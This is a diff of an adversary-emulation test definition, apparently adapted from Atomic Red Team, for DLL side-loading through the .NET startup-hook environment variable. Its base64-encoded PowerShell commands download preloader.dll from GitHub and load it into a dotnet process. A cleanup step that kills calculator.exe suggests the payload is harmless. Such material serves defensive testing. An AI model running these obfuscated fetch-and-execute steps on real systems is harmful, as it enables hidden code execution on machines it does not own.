@@ -1,26 +1,17 @@
-- id: 6baf7991-e8d2-5627-b965-0dde6d993481
+- requirements: []
   name: Soumaia ART Tests - DLL Side-Loading using the dotnet startup hook environment variable
   description: Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)
   tactic: stealth
-  technique:
-    attack_id: T1574.001
-    name: 'Hijack Execution Flow: DLL'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAGQAbwB0AG4AZQB0AFwAZABvAHQAbgBlAHQALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if not "%ERRORLEVEL%"=="0" (
-              powershell -NoProfile -EncodedCommand dwBpAG4AZwBlAHQAIABpAG4AcwB0AGEAbABsACAATQBpAGMAcgBvAHMAbwBmAHQALgBEAG8AdABOAGUAdAAuAFMARABLAC4ANgAgAC0ALQBhAGMAYwBlAHAAdAAtAHMAbwB1AHIAYwBlAC0AYQBnAHIAZQBlAG0AZQBuAHQAcwAgAC0ALQBhAGMAYwBlAHAAdAAtAHAAYQBjAGsAYQBnAGUALQBhAGcAcgBlAGUAbQBlAG4AdABzACAALQBoACAAPgAgACQAbgB1AGwAbAAKAGUAYwBoAG8ALgAKAA==
-          )
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAHAAcgBlAGwAbwBhAGQAZQByAC4AZABsAGwAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
-          if not "%ERRORLEVEL%"=="0" (
-              powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADcANAAuADAAMAAxAC8AYgBpAG4ALwBwAHIAZQBsAG8AYQBkAGUAcgAuAGQAbABsAD8AcgBhAHcAPQB0AHIAdQBlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABwAHIAZQBsAG8AYQBkAGUAcgAuAGQAbABsACIACgA=
-          )
-          set DOTNET_STARTUP_HOOKS=".\preloader.dll"
-          dotnet -h > nul
-          echo.
-        cleanup: |-
-          taskkill /F /IM calculator.exe >nul 2>&1
-        payloads:
-        - preloader.dll
+  technique_id: T1574.001
+  technique_name: 'Hijack Execution Flow: DLL'
+  executors:
+  - cleanup:
+    - taskkill /F /IM calculator.exe >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - preloader.dll
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAGQAbwB0AG4AZQB0AFwAZABvAHQAbgBlAHQALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand dwBpAG4AZwBlAHQAIABpAG4AcwB0AGEAbABsACAATQBpAGMAcgBvAHMAbwBmAHQALgBEAG8AdABOAGUAdAAuAFMARABLAC4ANgAgAC0ALQBhAGMAYwBlAHAAdAAtAHMAbwB1AHIAYwBlAC0AYQBnAHIAZQBlAG0AZQBuAHQAcwAgAC0ALQBhAGMAYwBlAHAAdAAtAHAAYQBjAGsAYQBnAGUALQBhAGcAcgBlAGUAbQBlAG4AdABzACAALQBoACAAPgAgACQAbgB1AGwAbAAKAGUAYwBoAG8ALgAKAA== ) & powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAHAAcgBlAGwAbwBhAGQAZQByAC4AZABsAGwAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA== & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADcANAAuADAAMAAxAC8AYgBpAG4ALwBwAHIAZQBsAG8AYQBkAGUAcgAuAGQAbABsAD8AcgBhAHcAPQB0AHIAdQBlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABwAHIAZQBsAG8AYQBkAGUAcgAuAGQAbABsACIACgA= ) & set DOTNET_STARTUP_HOOKS=".\preloader.dll" & dotnet -h > nul & echo.
+  id: 6baf7991-e8d2-5627-b965-0dde6d993481
